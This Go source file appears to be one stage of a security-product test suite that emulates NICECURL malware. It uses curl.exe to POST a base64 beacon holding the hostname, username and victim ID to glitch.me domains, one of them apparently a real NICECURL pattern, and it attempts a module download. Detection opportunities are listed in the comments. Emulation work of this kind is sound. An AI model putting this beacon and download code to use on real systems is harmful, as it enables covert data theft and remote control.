//go:build windows
// +build windows

/*
STAGE 3: curl.exe HTTPS C2 Communication (T1071.001 + T1105)
Simulates NICECURL's use of curl.exe for HTTPS C2 communication to
a Glitch.me-themed domain. NICECURL deliberately uses curl.exe because
it is a legitimate Windows utility found in developer/admin environments,
allowing it to blend with normal traffic (Living off the Land).

Detection opportunities:
  - curl.exe spawned by or shortly after wscript.exe/cscript.exe
  - HTTPS connection attempts to suspicious Glitch-themed domains
  - curl.exe used for outbound HTTPS from non-interactive context
  - Base64-encoded data in curl command arguments
*/

package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

const (
	TEST_UUID      = "8e2cf534-857b-4d29-a1ac-0f23d248db93"
	TECHNIQUE_ID   = "T1071.001"
	TECHNIQUE_NAME = "curl.exe HTTPS C2 Communication"
	STAGE_ID       = 3
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))

	LogMessage("INFO", TECHNIQUE_ID, "Starting curl.exe HTTPS C2 simulation")
	LogMessage("INFO", TECHNIQUE_ID, "Simulating NICECURL Living off the Land C2 via curl.exe")
	LogStageStart(STAGE_ID, TECHNIQUE_ID, "curl.exe HTTPS C2 to Glitch-themed endpoint")

	if err := performTechnique(); err != nil {
		fmt.Printf("[STAGE %s] Technique failed: %v\n", TECHNIQUE_ID, err)
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Technique failed: %v", err))

		exitCode := determineExitCode(err)
		if exitCode == StageBlocked || exitCode == StageQuarantined {
			LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
		} else {
			LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", err.Error())
		}
		os.Exit(exitCode)
	}

	fmt.Printf("[STAGE %s] curl.exe C2 simulation completed\n", TECHNIQUE_ID)
	LogMessage("SUCCESS", TECHNIQUE_ID, "curl.exe HTTPS C2 communication simulated")
	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "curl.exe used for HTTPS C2 to Glitch-themed domain simulation")
	os.Exit(StageSuccess)
}

func performTechnique() error {
	// NICECURL C2 behavior:
	// 1. Uses curl.exe (legitimate Windows binary) for HTTPS C2
	// 2. Connects to Glitch.me platform (e.g., accurate-sprout-porpoise.glitch.me)
	// 3. Sends base64-encoded victim data
	// 4. Uses bitwise NOT + Base64 obfuscation for payloads
	//
	// We simulate by:
	// a) Verifying curl.exe is available (it is on Windows 10+)
	// b) Constructing a base64-encoded beacon payload
	// c) Using curl.exe to attempt HTTPS connections to safe targets
	//    that model the Glitch.me C2 pattern (connection will fail safely)
	// d) Writing the simulated C2 request/response to log

	// Step 1: Locate curl.exe
	curlPath := filepath.Join(os.Getenv("SystemRoot"), "System32", "curl.exe")
	if _, err := os.Stat(curlPath); os.IsNotExist(err) {
		// Try PATH
		var lookErr error
		curlPath, lookErr = exec.LookPath("curl.exe")
		if lookErr != nil {
			return fmt.Errorf("curl.exe not available on this system (requires Windows 10 1803+)")
		}
	}
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Located curl.exe: %s", curlPath))

	// Step 2: Build the C2 beacon payload (models NICECURL's encoding)
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")

	// Read victim ID from previous stage if available
	victimID := "unknown"
	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData != "" {
		if data, err := os.ReadFile(filepath.Join(localAppData, "config.txt")); err == nil {
			for _, line := range strings.Split(string(data), "\n") {
				if strings.HasPrefix(line, "victim_id=") {
					victimID = strings.TrimPrefix(line, "victim_id=")
					victimID = strings.TrimSpace(victimID)
					break
				}
			}
		}
	}

	// Build beacon in NICECURL's format
	beacon := fmt.Sprintf("vid=%s&h=%s&u=%s&t=%d&ver=NICECURL/2.0",
		victimID, hostname, username, time.Now().Unix())
	encodedBeacon := base64.StdEncoding.EncodeToString([]byte(beacon))

	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("C2 beacon constructed: %s", beacon))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Base64-encoded beacon: %s", encodedBeacon[:40]+"..."))

	// Step 3: Write beacon data to staging file (detection opportunity)
	stagingDir := filepath.Join("c:\\F0", "c2_staging")
	if err := os.MkdirAll(stagingDir, 0755); err != nil {
		return fmt.Errorf("failed to create C2 staging directory: %v", err)
	}

	beaconFile := filepath.Join(stagingDir, "nicecurl_beacon.dat")
	if err := os.WriteFile(beaconFile, []byte(encodedBeacon), 0644); err != nil {
		return fmt.Errorf("failed to write beacon staging file: %v", err)
	}
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Beacon staged: %s (%d bytes)", beaconFile, len(encodedBeacon)))

	// Step 4: Execute curl.exe with Glitch-themed C2 endpoints
	// These are non-existent domains that model the real C2 pattern.
	// The DNS resolution will fail safely (no actual C2 traffic).
	// The key detection signal is curl.exe making HTTPS requests to suspicious
	// domains from a script/binary context.
	c2Endpoints := []struct {
		url  string
		desc string
	}{
		{
			url:  "https://accurate-sprout-porpoise.glitch.me/api/v2/check",
			desc: "Glitch.me C2 check-in (matches real NICECURL pattern)",
		},
		{
			url:  "https://f0rt1ka-sim-c2-node.glitch.me/api/v2/beacon",
			desc: "Glitch.me C2 beacon endpoint",
		},
	}

	curlAttempts := 0
	curlSuccesses := 0

	for i, endpoint := range c2Endpoints {
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("C2 attempt %d/%d: %s", i+1, len(c2Endpoints), endpoint.desc))
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("curl.exe target: %s", endpoint.url))

		// Build curl command matching NICECURL's patterns:
		// -s (silent), -k (allow insecure), --connect-timeout 5
		// -X POST with base64-encoded data
		// -H with custom headers
		cmd := exec.Command(curlPath,
			"-s",                       // Silent mode
			"-k",                       // Allow self-signed certs (NICECURL does this)
			"--connect-timeout", "5",   // Short timeout (will fail on non-existent domain)
			"--max-time", "8",          // Max total time
			"-X", "POST",              // POST method
			"-H", "Content-Type: application/x-www-form-urlencoded",
			"-H", fmt.Sprintf("X-Request-ID: %s", victimID),
			"-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) NICECURL/2.0",
			"-d", fmt.Sprintf("data=%s", encodedBeacon),
			"-o", filepath.Join(stagingDir, fmt.Sprintf("c2_response_%d.dat", i+1)),
			"-w", "%{http_code}",
			endpoint.url,
		)

		output, err := cmd.CombinedOutput()
		curlAttempts++

		if err != nil {
			// Expected: DNS resolution fails or connection refused
			// This is NOT an EDR block unless curl.exe itself was prevented from running
			if exitErr, ok := err.(*exec.ExitError); ok {
				exitCode := exitErr.ExitCode()
				LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("curl.exe exit code %d for %s (output: %s)", exitCode, endpoint.url, strings.TrimSpace(string(output))))
				// curl exit codes: 6 = DNS failed, 7 = connection refused, 28 = timeout
				// These are expected for non-existent domains
				if exitCode == 6 || exitCode == 7 || exitCode == 28 || exitCode == 35 {
					LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Expected curl failure (DNS/connection): exit %d", exitCode))
				}
			} else {
				// curl.exe could not start - possible EDR prevention
				return fmt.Errorf("curl.exe execution was prevented: %v", err)
			}
		} else {
			// Unexpected success (domain somehow resolved)
			httpCode := strings.TrimSpace(string(output))
			LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("curl.exe received HTTP %s from %s", httpCode, endpoint.url))
			curlSuccesses++
		}
	}

	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("C2 communication summary: %d attempts, %d successful responses", curlAttempts, curlSuccesses))

	// Step 5: Also attempt a curl download (T1105 - Ingress Tool Transfer)
	// NICECURL downloads additional modules from C2
	LogMessage("INFO", TECHNIQUE_ID, "Simulating tool transfer attempt via curl.exe (T1105)")

	downloadPath := filepath.Join(stagingDir, "module_update.dat")
	dlCmd := exec.Command(curlPath,
		"-s", "-k",
		"--connect-timeout", "5",
		"--max-time", "8",
		"-o", downloadPath,
		"https://accurate-sprout-porpoise.glitch.me/api/v2/module/update",
	)

	dlOutput, dlErr := dlCmd.CombinedOutput()
	if dlErr != nil {
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Module download attempt failed (expected): %s", strings.TrimSpace(string(dlOutput))))
	} else {
		LogMessage("INFO", TECHNIQUE_ID, "Module download attempt completed")
	}

	// Step 6: Verify staging files survive (not quarantined)
	time.Sleep(2 * time.Second)
	if _, err := os.Stat(beaconFile); os.IsNotExist(err) {
		return fmt.Errorf("C2 beacon staging file was removed")
	}

	LogMessage("INFO", TECHNIQUE_ID, "C2 simulation complete: curl.exe used for HTTPS POST to Glitch-themed endpoints")
	LogMessage("INFO", TECHNIQUE_ID, "Detection points: curl.exe HTTPS POST, Glitch.me domain, base64 beacon data, custom User-Agent")

	// Cleanup staging directory
	defer func() {
		os.RemoveAll(stagingDir)
		LogMessage("INFO", TECHNIQUE_ID, "C2 staging directory cleaned up")
	}()

	return nil
}

// ==============================================================================
// EXIT CODE DETERMINATION
// ==============================================================================

func determineExitCode(err error) int {
	if err == nil {
		return StageSuccess
	}
	errStr := err.Error()
	if containsAny(errStr, []string{"access denied", "access is denied", "permission denied", "operation not permitted", "was prevented"}) {
		return StageBlocked
	}
	if containsAny(errStr, []string{"quarantined", "virus", "threat"}) {
		return StageQuarantined
	}
	if containsAny(errStr, []string{"not found", "does not exist", "no such", "not running", "not available"}) {
		return StageError
	}
	return StageError
}

func containsAny(s string, substrings []string) bool {
	for _, substr := range substrings {
		if containsCI(s, substr) {
			return true
		}
	}
	return false
}

func containsCI(s, substr string) bool {
	return len(s) >= len(substr) && indexIgnoreCase(s, substr) >= 0
}

func indexIgnoreCase(s, substr string) int {
	s = toLowerStr(s)
	substr = toLowerStr(substr)
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return i
		}
	}
	return -1
}

func toLowerStr(s string) string {
	result := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c >= 'A' && c <= 'Z' {
			c = c + ('a' - 'A')
		}
		result[i] = c
	}
	return string(result)
}
